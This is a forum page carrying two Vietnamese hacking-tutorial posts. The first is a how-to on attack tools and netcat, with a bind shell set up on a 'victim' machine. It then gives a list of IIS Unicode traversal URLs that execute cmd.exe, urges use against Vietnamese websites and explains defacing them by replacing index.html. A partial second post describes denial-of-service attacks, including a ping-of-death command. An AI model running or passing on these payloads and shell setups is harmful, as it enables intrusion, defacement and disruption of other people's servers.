<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Messages posted by phuchn71, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Messages posted by phuchn71 - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="" title="[Logo]">
								<img src="/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.html"><img src="/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.html">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.html"><img src="/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.html">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.html"><img src="/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.html">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.html"><img src="/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.html">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.html"><img src="/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.html">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.html"><img src="/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.html"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.html">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.html"><img src="/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.html">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.html">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<script type="text/javascript" src="/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript">
<!--

function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.html', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}

-->
</script>

<table cellspacing="0" cellpadding="10" width="98%" align="center" border="0">
	<tr>
		<td class="bodyline">
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					<td valign="middle" align="left" colspan="2">
						<span class="maintitle"><a href="/hvaonline/posts/listByUser/29098.html" name="top" class="maintitle" id="top">Messages posted by: phuchn71</a></span>
						&nbsp;<a href="/hvaonline/rss/showPostsByUser/29098.html"><img src="/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML" /></a>
					</td>
				</tr>
			</table>
			
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						<a href="/hvaonline/user/profile/29098.html">Profile for phuchn71</a> 
            			<img src="/hvaonline/templates/viet/images/en_US/arrow.gif"><a href="/hvaonline/posts/listByUser/29098.html">Messages posted by phuchn71</a>
						</span>
					</td>
										
					<td valign="middle" align="right">
						<span class="nav">[ number of posts not being displayed on this page: <span class="moderator">5</span> ]</span>
					</td>
				</tr>
			</table>

			
      <table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0">
        <tr>
          <th height="26" nowrap="nowrap" class="thleft">&nbsp;</th>
        </tr>

				
        <!-- POST LISTING -->
         
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/131.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/131/523.html#523,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><br/><br/> <font size='+3'><b>Phần 8 . </b></font><br/><br/> <b>47 . ) Các công cụ cần thiết để hack Web :</b><br/><br/> _ Đối với các hacker chuyên nghiệp thì họ sẽ không cần sử dụng những công cụ này mà họ sẽ trực tiếp setup phiên bản mà trang Web nạn nhân sử dụng trên máy của mình để test lỗi . Nhưng đối với các bạn mới “vào nghề” thì những công cụ này rất cần thiết , hãy sử dụng chúng một vài lần bạn sẽ biết cách phối hợp chúng để việc tìm ra lỗi trên các trang Web nạn nhân được nhanh chóng nhất . Sau đây là một số công cụ bạn cần phải có trên máy “làm ăn” của mình :<br/> _ Công cụ thứ 1 : Một cái proxy dùng để che dấu IP và vượt tường lửa khi cần ( Cách tạo 1 cái Proxy tôi đã bày ở phần 7 , các bạn hãy xem lại nhé ) .<br/> _ Công cụ thứ 2 : Bạn cần có 1 shell account, cái này thực sự quan trọng đối với bạn . Một shell account tốt là 1 shell account cho phép bạn chạy các chương trình chính như nslookup, host, dig, ping, traceroute, telnet, ssh, ftp,...và shell account đó cần phải cài chương trình GCC ( rất quan trọng trong việc dịch (compile) các exploit được viết bằng C) như MinGW, Cygwin và các dev tools khác.<br/> Shell account gần giống với DOS shell,nhưng nó có nhiều câu lệnh và chức năng hơn DOS . Thông thường khi bạn cài Unix thì bạn sẽ có 1 shell account, nếu bạn không cài Unix thì bạn nên đăng ký trên mạng 1 shell account free hoặc nếu có ai đó cài Unix và thiết lập cho bạn 1 shell account thì bạn có thể log vào telnet (Start --&gt; Run --&gt; gõ Telnet) để dùng shell account đó. Sau đây là 1 số địa chỉ bạn có thể đăng ký free shell account :<br/><span class="link"> http://www.freedomshell.com/</span><br/><span class="link"> http://www.cyberspace.org/shell.html</span><br/><span class="link"> http://www.ultrashell.net/</span><br/> _Công cụ thứ 3 : NMAP là Công cụ quét cực nhanh và mạnh. Có thể quét trên mạng diện rộng và đặc biệt tốt đối với mạng đơn lẻ. NMAP giúp bạn xem những dịch vụ nào đang chạy trên server (services / ports : webserver , ftpserver , pop3,...),server đang dùng hệ điều hành gì,loại tường lửa mà server sử dụng,...và rất nhiều tính năng khác.Nói chung NMAP hỗ trợ hầu hết các kỹ thuật quét như : ICMP (ping aweep),IP protocol , Null scan , TCP SYN (half open),... NMAP được đánh giá là công cụ hàng đầu của các Hacker cũng như các nhà quản trị mạng trên thế giới.<br/> Mọi thông tin về NMAP bạn tham khảo tại<span class="link"> http://www.insecure.org/</span> .<br/> _ Công cụ thứ 4 : Stealth HTTP Security Scanner là công cụ quét lỗi bảo mật tuyệt vời trên Win32. Nó có thể quét được hơn 13000 lỗi bảo mật và nhận diện được 5000 exploits khác.<br/> _ Công cụ thứ 5 : IntelliTamper là công cụ hiển thị cấu trúc của một Website gồm những thư mục và file nào, nó có thể liệt kê được cả thư mục và file có set password. Rất tiện cho việc Hack Website vì trước khi bạn Hack một Website thì bạn phải nắm một số thông tin của Admin và Website đó.<br/> _ Công cụ thứ 6 : Netcat là công cụ đọc và ghi dữ liệu qua mạng thông qua giao thức TCP hoặc UDP. Bạn có thể dùng Netcat 1 cách trực tiếp hoặc sử dụng chương trình script khác để điều khiển Netcat. Netcat được coi như 1 exploitation tool do nó có thể tạo được liên kết giữa bạn và server cho việc đọc và ghi dữ liệu ( tất nhiên là khi Netcat đã được cài trên 1 server bị lỗI ). Mọi thông tin về Netcat bạn có thể tham khảo tại<span class="link"> http://www.l0pht.com/</span> .<br/> _ Công cụ thứ 7 : Active Perl là công cụ đọc các file Perl đuôi *.pl vì các exploit thường được viết bằng Perl . Nó còn được sử dụng để thi hành các lệnh thông qua các file *.pl .<br/> _ Công cụ thứ 8 : Linux là hệ điều hành hầu hết các hacker đều sử dụng.<br/> _ Công cụ thứ 9 : L0phtCrack là công cụ số một để Crack Password của Windows NT/2000 .<br/> _ Cách Download tôi đã bày rồi nên không nói ở đây , các bạn khi Download nhớ chú ý đến các phiên bản của chúng , phiên bản nào có số lớn nhất thì các bạn hãy Down về mà sài vì nó sẽ có thêm một số tính năng mà các phiên bản trước chưa có . Nếu down về mà các bạn không biết sử dụng thì tìm lại các bài viết cũ có hướng dẫn bên Box “Đồ nghề” . Nếu vẫn không thấy thì cứ post bài hỏi , các bạn bên đó sẽ trả lời cho bạn .<br/><br/> <b>48 . ) Hướng dẫn sử dụng Netcat :</b><br/><br/> a . ) Giới thiệu : Netcat là một công cụ không thể thiếu được nếu bạn muốn hack một website nào đó vì nó rất mạnh và tiện dụng . Do đó bạn cần biết một chút về Netcat .<br/> b . ) Biên dịch :<br/> _ Đối với bản Netcat cho Linux, bạn phải biên dịch nó trước khi sử dụng.<br/> - hiệu chỉnh file netcat.c bằng vi: vi netcat.c<br/> + tìm dòng res_init(); trong main() và thêm vào trước 2 dấu "/": // res_init();<br/> + thêm 2 dòng sau vào phần #define (nằm ở đầu file):<br/><br/> #define GAPING_SECURITY_HOLE<br/> #define TELNET<br/><br/> - biên dịch: make linux<br/> - chạy thử: ./nc -h<br/> - nếu bạn muốn chạy Netcat bằng nc thay cho ./nc, bạn chỉ cần hiệu chỉnh lại biến môi trường PATH trong file ~/.bashrc, thêm vào ":."<br/> PATH=/sbin:/usr/sbin:...:.<br/> _ Bản Netcat cho Win không cần phải compile vì đã có sẵn file nhị phân nc.exe. Chỉ vậy giải nén và chạy là xong.<br/> c . ) Các tùy chọn của Netcat :<br/> _ Netcat chạy ở chế độ dòng lệnh. Bạn chạy nc -h để biết các tham số:<br/><br/><br/> <blockquote>CODE<br/> C:\&gt;nc -h<br/> connect to somewhere: nc [-options] hostname port[s] [ports] ...<br/> listen for inbound: nc -l -p port [options] [hostname] [port]<br/> options:<br/> -d ----------- tách Netcat khỏi cửa sổ lệnh hay là console, Netcat sẽ chạy ở chế độ steath(không hiển thị trên thanh Taskbar)<br/> -e prog --- thi hành chương trình prog, thường dùng trong chế độ lắng nghe<br/> -h ----------- gọi hướng dẫn<br/> -i secs ----- trì hoãn secs mili giây trước khi gởi một dòng dữ liệu đi<br/> -l ------------- đặt Netcat vào chế độ lắng nghe để chờ các kết nối đến<br/> -L ------------ buộc Netcat "cố" lắng nghe. Nó sẽ lắng nghe trở lại sau mỗi khi ngắt một kết nối.<br/> -n ------------ chỉ dùng địa chỉ IP ở dạng số, chẳng hạn như 192.168.16.7, Netcat sẽ không thẩm vấn DNS<br/> -o ------------ file ghi nhật kí vào file<br/> -p port ----- chỉ định cổng port<br/> -r yêu cầu Netcat chọn cổng ngẫu nhiên(random)<br/> -s addr ----- giả mạo địa chỉ IP nguồn là addr<br/> -t ------------- không gởi các thông tin phụ đi trong một phiên telnet. Khi bạn telnet đến một telnet daemon(telnetd), telnetd thường yêu cầu trình telnet client của bạn gởi đến các thông tin phụ như biến môi trường TERM, USER. Nếu bạn sử dụng netcat với tùy chọn -t để telnet, netcat sẽ không gởi các thông tin này đến telnetd.<br/> -u ------------- dùng UDP(mặc định netcat dùng TCP)<br/> -v ------------- hiển thị chi tiết các thông tin về kết nối hiện tại.<br/> -vv ----------- sẽ hiển thị thông tin chi tiết hơn nữa.<br/> -w secs ---- đặt thời gian timeout cho mỗi kết nối là secs mili giây<br/> -z ------------- chế độ zero I/O, thường được sử dụng khi scan port&nbsp;
</blockquote><br/><br/><br/> Netcat hổ trợ phạm vi cho số hiệu cổng. Cú pháp là cổng1-cổng2. Ví dụ: 1-8080 nghĩa là 1,2,3,..,8080<br/><br/> d . ) Tìm hiểu Netcat qua các VD :<br/><br/> _ Chộp banner của web server :<br/><br/> Ví dụ: nc đến 172.16.84.2, cổng 80<br/><br/><br/> <blockquote>CODE<br/> C:\&gt;nc 172.16.84.2 80<br/> HEAD / HTTP/1.0 (tại đây bạn gõ Enter 2 lần)<br/> HTTP/1.1 200 OK<br/> Date: Sat, 05 Feb 2000 20:51:37 GMT<br/> Server: Apache-AdvancedExtranetServer/1.3.19 (Linux-Mandrake/3mdk) mod_ssl/2.8.2<br/> OpenSSL/0.9.6 PHP/4.0.4pl1<br/> Connection: close<br/> Content-Type: text/html&nbsp;
</blockquote><br/><br/> Để biết thông tin chi tiết về kết nối, bạn có thể dùng –v ( -vv sẽ<br/> cho biết các thông tin chi tiết hơn nữa)<br/><br/> C:\&gt;nc -vv 172.16.84.1 80<br/><br/><br/> <blockquote>CODE<br/> 172.16.84.1: inverse host lookup failed: h_errno 11004: NO_DATA<br/> (UNKNOWN) [172.16.84.1] 80 (?) open<br/> HEAD / HTTP/1.0<br/> HTTP/1.1 200 OK<br/> Date: Fri, 04 Feb 2000 14:46:43 GMT<br/> Server: Apache/1.3.20 (Win32)<br/> Last-Modified: Thu, 03 Feb 2000 20:54:02 GMT<br/> ETag: "0-cec-3899eaea"<br/> Accept-Ranges: bytes<br/> Content-Length: 3308<br/> Connection: close<br/> Content-Type: text/html<br/> sent 17, rcvd 245: NOTSOCK&nbsp;
</blockquote><br/><br/><br/> Nếu muốn ghi nhật kí, hãy dùng -o &lt;tên_file&gt;. Ví dụ:<br/><br/> nc -vv -o nhat_ki.log 172.16.84.2 80<br/><br/> xem file nhat_ki.log xem thử nó đã ghi những gì nhé :<br/><br/><br/> <blockquote>CODE<br/> &lt; 00000000 48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d # HTTP/1.1 200 OK.<br/> &lt; 00000010 0a 44 61 74 65 3a 20 46 72 69 2c 20 30 34 20 46 # .Date: Fri, 04 F<br/> &lt; 00000020 65 62 20 32 30 30 30 20 31 34 3a 35 30 3a 35 34 # eb 2000 14:50:54<br/> &lt; 00000030 20 47 4d 54 0d 0a 53 65 72 76 65 72 3a 20 41 70 # GMT..Server: Ap<br/> &lt; 00000040 61 63 68 65 2f 31 2e 33 2e 32 30 20 28 57 69 6e # ache/1.3.20 (Win<br/> &lt; 00000050 33 32 29 0d 0a 4c 61 73 74 2d 4d 6f 64 69 66 69 # 32)..Last-Modifi<br/> &lt; 00000060 65 64 3a 20 54 68 75 2c 20 30 33 20 46 65 62 20 # ed: Thu, 03 Feb<br/> &lt; 00000070 32 30 30 30 20 32 30 3a 35 34 3a 30 32 20 47 4d # 2000 20:54:02 GM<br/> &lt; 00000080 54 0d 0a 45 54 61 67 3a 20 22 30 2d 63 65 63 2d # T..ETag: "0-cec-<br/> &lt; 00000090 33 38 39 39 65 61 65 61 22 0d 0a 41 63 63 65 70 # 3899eaea"..Accep<br/> &lt; 000000a0 74 2d 52 61 6e 67 65 73 3a 20 62 79 74 65 73 0d # t-Ranges: bytes.<br/> &lt; 000000b0 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68 3a # .Content-Length:<br/> &lt; 000000c0 20 33 33 30 38 0d 0a 43 6f 6e 6e 65 63 74 69 6f # 3308..Connectio<br/> &lt; 000000d0 6e 3a 20 63 6c 6f 73 65 0d 0a 43 6f 6e 74 65 6e # n: close..Conten<br/> &lt; 000000e0 74 2d 54 79 70 65 3a 20 74 65 78 74 2f 68 74 6d # t-Type: text/htm<br/> &lt; 000000f0 6c 0d 0a 0d 0a # l....&nbsp;
</blockquote><br/><br/><br/> dấu &lt; nghĩa là server gởi đến netcat<br/> dấu &gt; nghĩa là netcat gởi đến server<br/><br/> _ Quét cổng :<br/> Bạn hãy chạy netcat với tùy chọn –z . Nhưng để quét cổng nhanh hơn, bạn hãy dùng -n vì netcat sẽ không cần thấm vấn DNS. Ví dụ để scan các cổng TCP(1-&gt;500) của host 172.16.106.1<br/><br/><br/> <blockquote>CODE<br/> [dt@vicki /]# nc -nvv -z 172.16.106.1 1-500<br/> (UNKNOWN) [172.16.106.1] 443 (?) open<br/> (UNKNOWN) [172.16.106.1] 139 (?) open<br/> (UNKNOWN) [172.16.106.1] 111 (?) open<br/> (UNKNOWN) [172.16.106.1] 80 (?) open<br/> (UNKNOWN) [172.16.106.1] 23 (?) open&nbsp;
</blockquote><br/><br/> nếu bạn cần scan các cổng UDP, dùng -u<br/><br/><br/> <blockquote>CODE<br/> [dt@vicki /]# nc -u -nvv -z 172.16.106.1 1-500<br/> (UNKNOWN) [172.16.106.1] 1025 (?) open<br/> (UNKNOWN) [172.16.106.1] 1024 (?) open<br/> (UNKNOWN) [172.16.106.1] 138 (?) open<br/> (UNKNOWN) [172.16.106.1] 137 (?) open<br/> (UNKNOWN) [172.16.106.1] 123 (?) open<br/> (UNKNOWN) [172.16.106.1] 111 (?) open&nbsp;
</blockquote><br/><br/> _ Biến Netcat thành một trojan :<br/> Trên máy tính của nạn nhân, bạn khởi động netcat vào chế độ lắng nghe, dùng tùy chọn –l ( listen ) và -p port để xác định số hiệu cổng cần lắng nghe, -e &lt;tên_chương_trình_cần_chạy&gt; để yêu cầu netcat thi hành 1 chương trình khi có 1 kết nối đến, thường là shell lệnh cmd.exe ( đối với NT) hoặc /bin/sh(đối với Unix). Ví dụ:<br/><br/><br/> <blockquote>CODE<br/> E:\&gt;nc -nvv -l -p 8080 -e cmd.exe<br/> listening on [any] 8080 ...<br/> connect to [172.16.84.1] from (UNKNOWN) [172.16.84.1] 3159<br/> sent 0, rcvd 0: unknown socket error&nbsp;
</blockquote><br/><br/> Trên máy tính dùng để tấn công, bạn chỉ việc dùng netcat nối đến máy nạn nhân trên cổng đã định, chẳng hạn như 8080<br/><br/><br/> <blockquote>CODE<br/> C:\&gt;nc -nvv 172.16.84.2 8080<br/> (UNKNOWN) [172.16.84.2] 8080 (?) open<br/> Microsoft Windows 2000 [Version 5.00.2195]<br/> (C) Copyright 1985-1999 Microsoft Corp.<br/> E:\&gt;cd test<br/> cd test<br/> E:\test&gt;dir /w<br/> dir /w<br/> Volume in drive E has no label.<br/> Volume Serial Number is B465-452F<br/> Directory of E:\test<br/> [.] [..] head.log NETUSERS.EXE NetView.exe<br/> ntcrash.zip password.txt pwdump.exe<br/> 6 File(s) 262,499 bytes<br/> 2 Dir(s) 191,488,000 bytes free<br/> C:\test&gt;exit<br/> exit<br/> sent 20, rcvd 450: NOTSOCK&nbsp;
</blockquote><br/><br/><br/> Như các bạn đã thấy , ta có thể làm những gì trên máy của nạn nhân rồi , chỉ cần một số lệnh cơ bản , ta đã chiếm được máy tính của đối phương , các bạn hãy xem tiếp nhé :<br/><br/><br/> <blockquote>CODE<br/> E:\&gt;nc -nvv -L -p 8080 -e cmd.exe<br/> listening on [any] 8080 ...?<br/> ?&nbsp;
</blockquote><br/><br/> Riêng đối với Netcat cho Win, bạn có thể lắng nghe ngay trên cổng đang lắng nghe. Chỉ cần chỉ định địa chỉ nguồn là -s&lt;địa_chỉ_ip_của_máy_này&gt;. Ví dụ:<br/><br/><br/> <blockquote>CODE<br/> netstat -a<br/> ...<br/> TCP nan_nhan:domain nan_nhan:0 LISTENING &lt;- cổng 53 đang lắng nghe<br/> ...<br/> E:\&gt;nc -nvv -L -e cmd.exe -s 172.16.84.1 -p 53 -&gt; lắng nghe ngay trên cổng 53<br/> listening on [172.16.84.1] 53 ...<br/> connect to [172.16.84.1] from (UNKNOWN) [172.16.84.1] 3163?<br/> ?&nbsp;
</blockquote><br/><br/><br/> Trên Windows NT, để đặt Netcat ở chế độ lắng nghe, không cần phải có quyền Administrator, chỉ cần login vào với 1 username bình thường khởi động Netcat là xong.<br/> Chú ý: bạn không thể chạy netcat với ... -u -e cmd.exe... hoặc ...-u -e /bin/sh... vì netcat sẽ không làm việc đúng. Nếu bạn muốn có một UDP shell trên Unix, hãy dùng udpshell thay cho netcat.<br/><br/> <i>( Dựa theo bài viết của huynh Vicky )</i><br/><br/> <i>49 . ) Kỹ thuật hack IIS server 5.0 :</i><br/><br/> _ IIS server với các phiên bản từ trước đến phiên bản 5.0 đều có lỗi để ta có thể khai thác , do bây giờ hầu hết mọi người đều dùng IIS server 5.0 nên lỗi ở các phiên bản trước tôi không đề cập đến . Bây giờ tôi sẽ bày các bạn cách hack thông qua công cụ activeperl và IE , các bạn có thể vận dụng cho các trang Web ở VN vì chúng bị lỗi này rất nhiều . Ta hãy bắt đầu nhé .<br/> _ Trước hết các bạn hãy download activeperl và Unicode.pl .<br/> _ Sử dụng telnet để xác định trang Web ta tấn công có sử dụng IIS server 5.0 hay không :<br/><br/><br/> <blockquote>CODE<br/> telnet &lt; tên trang Web &gt; 80<br/> GET HEAD / HTTP/1.0&nbsp;
</blockquote><br/><br/> Nếu nó không báo cho ta biết mục tiêu đang sử dụng chương trình gì thì các bạn hãy thay đổi cổng 80 bằng các cổng khác như 8080, 81, 8000, 8001 .v.v…<br/> _ Sau khi đã xác định được mục tiêu các bạn vào DOS gõ :<br/><br/><br/> <blockquote>CODE<br/> perl unicode.pl<br/> Host: ( gõ địa chỉ server mà các bạn muốn hack )<br/> Port: 80 ( hoặc 8080, 81, 8000, 8001 tuỳ theo cổng mà ta đã telnet trước đó ) .&nbsp;
</blockquote><br/><br/> _ Các bạn sẽ thấy bảng liệt kê lỗi ( đã được lập trình trong Unicode.pl ) như sau :<br/><br/><br/> <blockquote>CODE<br/> [1] /scripts/..%c0%af../winnt/system32/cmd.exe?/c+<br/> [2]/scripts..%c1%9c../winnt/system32/cmd.exe?/c+<br/> [3] /scripts/..%c1%pc../winnt/system32/cmd.exe?/c+<br/> [4]/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+<br/> [5] /scripts/..%c0%qf../winnt/system32/cmd.exe?/c+<br/> [6] /scripts/..%c1%8s../winnt/system32/cmd.exe?/c+<br/> [7] /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+<br/> [8] /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+<br/> [9] /scripts/..%c1%af../winnt/system32/cmd.exe?/c+<br/> [10] /scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+<br/> [11]/scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+<br/> [12] /scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+<br/> [13]/scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+<br/> [14]/msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../winnt/system32/cmd.exe?/c+<br/> [15]/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+<br/> [16]/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+<br/> [17]/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+<br/> [18]/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+<br/> [19]/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+<br/> [20]/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+&nbsp;
</blockquote><br/><br/><br/> Các bạn sẽ thấy được tất cả các lỗi trên nếu trang Web nạn nhân bị tất cả những lỗi như vậy , nếu server của nạn nhân chỉ bị lỗi thứ 13 và 17 thì bảng kết quả chỉ xuất hiện dòng thứ 13 và 17 mà thôi .<br/> Tôi lấy VD là bảng kết quả cho tôi biết trang Web nạn nhân bị lỗi thứ 3 và 7 , tôi sẽ ra IE và nhập đoạn mã tương ứng trên Address :<br/><br/><span class="link"> http://www.xxx.com/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+</span> &lt; == lỗi dòng thứ 3<br/> hoặc<br/><span class="link"> http://www.xxx.com/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+</span> &lt; == lỗi dòng thứ 7<br/><br/> Đến đây các bạn đã có thể xâm nhập vào server của nạn nhân rồi đó , các bạn hãy sử dụng lệnh trong DOS mà khai thác thông tin trong này . Thông thường các trang Web nằm ở thư mục vinetpub\wwwroot , các bạn vào được rồI thì chỉ cần thay index.html vớI tên hack by …. Là được rồi , đừng quậy họ nhé .<br/><br/> GOOKLUCK!!!!!!!!!!!!!!!<br/><br/> ( Hết phần 8 )<br/> 111111111111111111111111111111111111<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/131.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/131/522.html#522,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><br/><br/> <font size='+3'><b>Phần 6</b></font><br/><br/> <b>38 . ) DoS attack là gì ? ( Denial Of Services Attack )</b><br/><br/> _ DoS attack ( dịch là tấn công từ chối dịch vụ ) là kiểu tấn công rất lợi hại , với loại tấn công này , bạn chỉ cần một máy tính kết nối Internet là đã có thể thực hiện việc tấn công được máy tính của đốI phương . thực chất của DoS attack là hacker sẽ chiếm dụng một lượng lớn tài nguyên trên server ( tài nguyên đó có thể là băng thông, bộ nhớ, cpu, đĩa cứng, ... ) làm cho server không thể nào đáp ứng các yêu cầu từ các máy của nguời khác ( máy của những người dùng bình thường ) và server có thể nhanh chóng bị ngừng hoạt động, crash hoặc reboot .<br/><br/> <b>39 . ) Các loại DoS attack hiện đang được biết đến và sử dụng :</b><br/><br/> a . ) Winnuke :<br/><br/> _DoS attack loại này chỉ có thể áp dụng cho các máy tính đang chạy Windows9x . Hacker sẽ gởi các gói tin với dữ liệu "Out of Band" đến cổng 139 của máy tính đích.( Cổng 139 chính là cổng NetBIOS, cổng này chỉ chấp nhận các gói tin có cờ Out of Band được bật ) . Khi máy tính của victim nhận được gói tin này, một màn hình xanh báo lỗi sẽ được hiển thị lên với nạn nhân do chương trình của Windows nhận được các gói tin này nhưng nó lại không biết phản ứng với các dữ liệu Out Of Band như thế nào dẫn đến hệ thống sẽ bị crash .<br/><br/> b . ) Ping of Death :<br/><br/> _ Ở kiểu DoS attack này , ta chỉ cần gửi một gói dữ liệu có kích thước lớn thông qua lệnh ping đến máy đích thì hệ thống của họ sẽ bị treo .<br/> _ VD : ping –l 65000<br/><br/> c . ) Teardrop :<br/><br/> _ Như ta đã biết , tất cả các dữ liệu chuyển đi trên mạng từ hệ thống nguồn đến hệ thống đích đều phải trải qua 2 quá trình : dữ liệu 